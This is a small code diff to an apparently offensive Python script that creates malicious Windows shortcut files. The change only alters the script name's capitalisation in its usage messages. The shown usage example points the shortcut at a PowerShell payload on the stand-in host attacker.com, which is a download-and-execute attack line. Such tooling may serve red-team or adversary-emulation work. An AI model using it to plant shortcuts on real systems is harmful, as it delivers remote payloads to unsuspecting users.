@@ -35,8 +35,8 @@ def create_malicious_lnk(output_path, payload_url):
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
-        print("Usage: ./t0842_lnk_creation.py <output_path.lnk> <payload_url>")
-        print("Example: ./t0842_lnk_creation.py /tmp/Reports.lnk http://attacker.com/payload.ps1")
+        print("Usage: ./T0842_lnk_creation.py <output_path.lnk> <payload_url>")
+        print("Example: ./T0842_lnk_creation.py /tmp/Reports.lnk http://attacker.com/payload.ps1")
         sys.exit(1)
     
     create_malicious_lnk(sys.argv[1], sys.argv[2])
